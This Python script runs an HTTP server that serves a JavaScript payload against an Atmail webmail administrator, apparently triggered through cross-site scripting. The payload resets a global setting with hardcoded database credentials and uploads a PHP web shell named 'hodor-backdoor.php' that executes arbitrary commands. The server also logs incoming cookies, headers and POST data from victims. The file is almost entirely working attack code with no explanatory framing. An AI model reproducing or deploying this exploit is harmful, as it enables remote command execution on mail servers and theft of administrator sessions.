#!/usr/bin/python3
import os
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer
from http.cookies import SimpleCookie

# Global variables
timeout = 5
server_token = "Apache"

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(0)

def printCookie(cookie):
    print("Cookies:")
    for key,morsel in cookie.items():
        print(morsel.key + "=" + morsel.value)

def js_code():
    js = ("""
// Variables
var filename = "hodor-backdoor.php";

// Read XHR body
function read_body(xhr) {
    var data;
    if (!xhr.responseType || xhr.responseType === "text") {
        data = xhr.responseText;
    } else if (xhr.responseType === "document") {
        data = xhr.responseXML;
    } else if (xhr.responseType === "json") {
        data = xhr.responseJSON;
    } else {
        data = xhr.response;
    }
    return data;
}

// Save globally to set the basefoldername to empty
function globalsave()
{
    var uri = "/index.php/admin/settings/globalsave";
    var query_string = "?save=1&fields%5Bsql_host%5D=127.0.0.1&fields%5Bsql_user%5D=root&fields%5Bsql_pass%5D=956ec84a45e0675851367c7e480ec0e9&fields%5Bsql_table%5D=atmail6&fields[tmpFolderBaseName]=";
    xhr = new XMLHttpRequest();
    xhr.open("GET", uri + query_string, true);
    xhr.send(null);
}

// Add attachment
function addattachment()
{
    var uri = "/index.php/mail/composemessage/addattachment/composeID/";
    xhr = new XMLHttpRequest();
    xhr.open("POST", uri, true);
    xhr.setRequestHeader("Content-Type","multipart/form-data; boundary=----WebKitFormBoundarye9MjEAWpKTX4IkNl");
    xhr.send('------WebKitFormBoundarye9MjEAWpKTX4IkNl\\n' +
         'Content-Disposition: form-data; name="newAttachment"; filename="' + filename + '\\n' +
         'Content-Type:\\n\\n' +
         '<?php\\n' +
         'if(isset($_REQUEST["cmd"])){\\n' +
         'echo "<pre>";\\n' +
         '$cmd = ($_REQUEST["cmd"]);\\n' +
         'system($cmd);\\n' +
         'echo "</pre>";\\n' +
         'die;\\n' +
         '}\\n' +
         '?>\\n' +
         '------WebKitFormBoundarye9MjEAWpKTX4IkNl--\\n');
}

// Call functions
globalsave();
addattachment();
""")
    return js

class serveHTTP(BaseHTTPRequestHandler):
    def do_GET(s):
        host = s.server.socket.getsockname()[0]
        port = s.server.socket.getsockname()[1]
        all_cookies = SimpleCookie(s.headers.get('Cookie'))
        s.server_version = server_token
        s.sys_version = ''
        s.send_response(200)
        s.send_header("Access-Control-Allow-Origin","*")
        s.end_headers()
        print("\n[*] GET:\nPath: " + str(s.path) + "\nHeaders:\n" + str(s.headers))
        printCookie(all_cookies)
        payload = js_code()
        s.wfile.write(payload.encode())

    def do_POST(s):
        host = s.server.socket.getsockname()[0]
        port = s.server.socket.getsockname()[1]
        all_cookies = SimpleCookie(s.headers.get('Cookie'))
        s.server_version = server_token
        s.sys_version = ''
        s.send_response(200)
        s.send_header("Access-Control-Allow-Origin","*")
        s.end_headers()
        if s.headers['Content-Length']:
            length = int(s.headers['Content-Length'])
            postVar = s.rfile.read(length)
            print("\n[*] POST:\nPath: " + str(s.path) + "\nHeaders:\n" + str(s.headers) + "Params:\n" +  postVar.decode() + "\n")
        else:
            print("\n[*] POST:\nPath: " + str(s.path) + "\nHeaders:\n" + str(s.headers) + "\n")
        printCookie(all_cookies)

# Main
def main(argv):
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
    else:
        print("[*] Usage: " + sys.argv[0] + " <listen_host> <listen_port>\n")
        exit(0)

    server_class = HTTPServer
    httpd = server_class((host, port), serveHTTP)

    # Do stuff
    try:
        print("[*] Accepting HTTP connections on host " + host + " port " + str(port) + "...")
        httpd.serve_forever()
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])
